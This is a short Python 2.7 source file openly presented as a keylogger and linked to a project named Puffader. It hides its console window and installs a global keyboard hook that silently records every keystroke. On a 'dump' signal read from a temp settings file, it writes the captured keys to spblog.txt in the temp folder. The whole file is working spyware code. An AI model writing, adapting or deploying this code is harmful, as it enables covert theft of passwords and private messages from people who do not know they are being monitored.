'''
Keylogger source, Python 2.7
Referenced from my other project: https://github.com/xp4xbox/Puffader
'''
import time, os, threading
import win32console, win32gui, win32event, win32api, winerror
from sys import exit
import pythoncom, pyHook

TMP = os.environ["TEMP"]

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
objTimer = threading.Timer(0, hide); objTimer.start()

# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "SPBKEY_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit(0)

strSettings = TMP + "/spbky.txt"

if os.path.isfile(strSettings):  # clear out settings
    txtData = open(strSettings, "w").close()

strLogs = ""


def CheckForOption():  # check weather to stop or dump
    global strLogs
    while True:
        time.sleep(0.5)
        if os.path.isfile(strSettings) and os.path.getsize(strSettings) > 0 and os.path.getsize(strSettings) < 20:
            txtData = open(strSettings, "r")
            txt = txtData.read()
            if txt == "stop":  # if the user chose to stop
                txtData.close()
                open(strSettings, "w").close()  # delete content
                break
            elif txt == "dump":  # if the user chose to dump keys
                txtData = open(TMP + "/spblog.txt", "w")
                txtData.write(strLogs)
                txtData.close()
                strLogs = ""
                open(strSettings, "w").close()
    os._exit(0)  # close pythoncom loop and program

objThread = threading.Thread(target=CheckForOption)
objThread.daemon = True
objThread.start()


def OnKeyboardEvent(event):
    global strLogs

    if event.Ascii == 8:
        strLogs = strLogs + " [Bck] "
    elif event.Ascii == 9:
        strLogs = strLogs + " [Tab] "
    elif event.Ascii == 13:
        strLogs = strLogs + "\n"
    elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
        pass
    else:
        strLogs = strLogs + chr(event.Ascii)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
